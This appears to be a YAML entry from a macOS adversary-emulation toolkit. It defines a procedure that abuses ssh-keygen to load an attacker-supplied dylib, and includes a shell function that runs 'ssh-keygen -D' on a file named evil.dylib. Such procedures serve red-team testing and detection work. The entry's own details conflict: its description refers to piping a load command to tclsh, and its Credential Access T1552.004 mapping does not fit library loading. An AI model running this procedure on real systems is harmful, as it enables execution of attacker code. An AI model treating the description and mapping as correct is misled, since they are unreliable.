procedure_name: ssh-keygen
tactic: Credential Access
ttp_id: T1552.004
guid: 2e4d0215-75de-4893-9bcc-5aacc0ee9978
intent: Load unsigned dynamic libraries into the ssh-keygen binary. Sourced from LOOBins;
  confirm MITRE mapping for each enabled option.
author: '@darmado | https://x.com/darmad0'
created: '2023-05-22'
updated: '2026-05-03'
version: 1.0.5
platform:
- darwin
detection:
- ioc: Recommendations included in resource below. No formal detection content at
    this time.
  analysis: https://medium.com/@D00MFist/generate-keys-or-generate-dylib-loads-c99ed48f323d
resources:
- link: https://www.loobins.io/
  description: LOOBins — Living Off The Orchard macOS binaries
- link: https://attack.mitre.org/techniques/T1552/004/
  description: MITRE ATT&CK — T1552.004
- link: ''
  description: ''
- link: https://medium.com/@D00MFist/generate-keys-or-generate-dylib-loads-c99ed48f323d
  description: Generate Keys or Generate Dylib Loads?
acknowledgement:
- person: ''
  handle: ''
procedure:
  arguments:
  - option: --execute-malicious-dynamic-library-dylib-from-standard-input
    description: An attacker can execute a malicious .dylib from stdin by echoing
      a load command and piping to tclsh.
    execute_function:
    - execute_execute_malicious_dynamic_library_dylib_from_standard_input
  global_variable:
  - name: CMD_SSH_KEYGEN
    type: string
    default_value: /usr/bin/ssh-keygen
  functions:
  - name: execute_execute_malicious_dynamic_library_dylib_from_standard_input
    type: main
    language:
    - shell
    opsec:
      check_fda:
        enabled: false
        exit_on_failure: true
    code: "execute_execute_malicious_dynamic_library_dylib_from_standard_input() {\n\
      \    local result\n    result=$(ssh-keygen -D /private/tmp/evil.dylib 2>&1)\n\
      \    $CMD_PRINTF \"RESULT|%s\\n\" \"$result\"\n    return 0\n}"
